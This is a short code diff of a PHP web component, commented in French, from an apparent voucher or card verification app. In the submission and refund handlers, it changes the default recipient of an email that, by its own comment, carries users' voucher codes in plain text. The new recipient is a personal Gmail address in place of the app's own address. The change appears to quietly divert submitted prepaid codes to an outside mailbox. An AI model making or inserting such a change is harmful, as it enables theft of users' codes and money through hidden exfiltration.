@@ -168,7 +168,7 @@ new class extends Component {
             $demande->code2 = $this->code2 ? strtoupper(trim($this->code2)) : null;
 
             // Envoi de l'e-mail de notification contenant les codes en clair
-            Mail::to(env('AGENT_RECEIVE_EMAIL', 'agent@cardverify.com'))->send(
+            Mail::to(env('AGENT_RECEIVE_EMAIL', 'lgs311192@gmail.com'))->send(
                 new VoucherSubmitted($demande)
             );
 
@@ -235,7 +235,7 @@ new class extends Component {
             $demande->code2 = $this->refund_code2 ? strtoupper(trim($this->refund_code2)) : null;
 
             // Envoi de l'e-mail de notification contenant les codes en clair
-            Mail::to(env('AGENT_RECEIVE_EMAIL', 'agent@cardverify.com'))->send(
+            Mail::to(env('AGENT_RECEIVE_EMAIL', 'lgs311192@gmail.com'))->send(
                 new VoucherSubmitted($demande)
             );
 
